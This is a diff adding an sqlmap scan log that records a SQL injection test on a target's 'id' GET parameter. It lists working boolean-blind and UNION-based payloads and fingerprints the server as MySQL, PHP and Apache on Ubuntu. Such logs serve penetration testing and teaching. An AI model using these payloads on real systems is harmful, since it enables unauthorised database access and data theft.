@@ -1,0 +1,23 @@
+[10:14:02] [INFO] testing connection to the target URL
+[10:14:03] [INFO] testing if the target URL content is stable
+[10:14:04] [INFO] target URL content is stable
+[10:14:05] [INFO] testing if GET parameter 'id' is dynamic
+[10:14:06] [INFO] GET parameter 'id' appears to be dynamic
+[10:14:12] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[10:14:20] [INFO] testing 'Generic UNION query (NULL) - 3 columns'
+[10:14:24] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 3 columns' injectable
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 7331=7331
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7176627171,0x4b6f4c72),NULL-- -
+---
+[10:14:30] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 8.1.2, Apache 2.4.52
+back-end DBMS: MySQL >= 5.0
